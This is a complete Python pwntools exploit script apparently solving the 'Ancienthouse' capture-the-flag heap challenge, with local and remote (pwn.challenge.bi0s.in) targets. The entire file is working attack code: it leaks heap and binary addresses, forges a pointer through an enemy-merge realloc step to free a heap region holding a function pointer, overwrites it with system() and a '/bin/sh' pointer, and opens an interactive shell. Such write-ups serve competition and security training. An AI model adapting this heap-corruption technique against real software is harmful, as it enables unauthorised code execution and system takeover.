#!/usr/bin/env python3

from pwn import *

the_binary = "./Ancienthouse"
context.binary = the_binary
elf = context.binary
libc = ELF("./libjemalloc.so", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("pwn.challenge.bi0s.in", 1230)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # string free in battle
        # pie break *0x158e

        # realloc call
        # pie break *0x18d4

        continue
    """)

def menu(choice):
    io.sendlineafter(">> ", str(choice))

def send_index(idx):
    io.sendlineafter("Challenge number: ", str(idx))

def pad(original, new_len, pad_char):
    assert new_len >= len(original)
    return original + (new_len - len(original)) * pad_char

def add_enemy(name, name_len=None, pad_char="\x00"):
    if name_len is None:
        name_len = len(name)
    else:
        name = pad(name, name_len, pad_char)

    menu(1)
    io.sendlineafter("size : ", str(name_len))
    io.sendafter("name : ", name)

def battle(idx, kill=False):
    menu(2)
    io.sendlineafter("id : ", str(idx))

    if kill:
        io.recvuntil("You beat 'em!")
        io.sendlineafter(">>", "1")

def free(idx, num_prev_hits=0):
    """Kill/free an enemy that starts at full health."""
    for _ in range(6 - num_prev_hits):
        battle(idx)
    battle(idx, kill=True)

def merge(idx_one, idx_two):
    menu(3)
    io.sendlineafter("id 1: ", str(idx_one))
    io.sendlineafter("id 2: ", str(idx_two))

class Const:
    default_health = 0x64

# Set our name, using max space available.
hero_name = "hero"*0x10
io.sendafter("halls!! : ", hero_name)

# Create two enemies; enemy0's name chunk will run right up to the enemy struct
# region of enemy1.
add_enemy("enemy0", name_len=0x20, pad_char="A")
add_enemy(pad("enemy1", 0x20-1, "B") + "\x00")

# Leak address of enemy1's name buffer when enemy0's name is printed.
battle(0)
io.recvuntil(pad("enemy0", 0x20, "A"))
heap_leak = u64(io.recvuntil(b"\x7f").ljust(8, b"\x00"))
function_ptr_region = heap_leak - 0x2040
log.info("heap leak: %#x" % heap_leak)
log.info("overwrite target: %#x" % function_ptr_region)

# Create two more enemies that we will merge to eventually free an arbitrary
# address. These are both 0x10-sized, so that their combined names will lead
# to a realloc call for size 0x20 (the size of an enemy struct).
add_enemy("enemy2", name_len=0x10, pad_char="C")
# Below adds enemy3. We avoid including its name in order to preserve the
# normal enemy health field, so we can kill/free it in a reasonable time later
# on.
add_enemy(b"A" + p64(function_ptr_region) + p32(Const.default_health), name_len=0x10, pad_char=b"\x00")

# We now delete enemy1 so that its name is used to service the upcoming
# realloc call.
free(1)

# Create one more enemy with a name sized so that it won't occupy a slot in the
# 0x20-sized region. This will allow the realloc call to return a slot
# immediately before an existing enemy. We also take this opportunity to place
# "/bin/sh" on the heap in a known location.
add_enemy("/bin/sh\x00", name_len=0x60)

# Overwrite enemy3's name pointer to point to function pointer stored on heap
# that we want to overwrite.
merge(2, 3)

# Leak an address from the binary.
battle(2)
io.recvuntil("Starting battle with ")
elf_leak = u64(io.recvuntil(" ...", drop=True).ljust(8, b"\x00"))
elf.address = elf_leak - 0x1b82
log.info("ELF leak: %#x" % elf_leak)
log.info("ELF base: %#x" % elf.address)

# enemy2 now has a forged name pointer. When we free enemy2, we are also
# freeing the region that was used to store a function pointer at the beginning
# of the program.
free(2, num_prev_hits=1)

# Overwrite the function pointer stored on the heap with a call system gadget,
# passing a pointer to a /bin/sh string that we place on the heap previously.
# call_system = p64(elf.address + 0x12f8)
call_system = p64(elf.plt.system)
bin_sh = p64(heap_leak + 0xfe0)
add_enemy(call_system + bin_sh, name_len=0x50, pad_char=b"")

menu(5)
io.interactive()
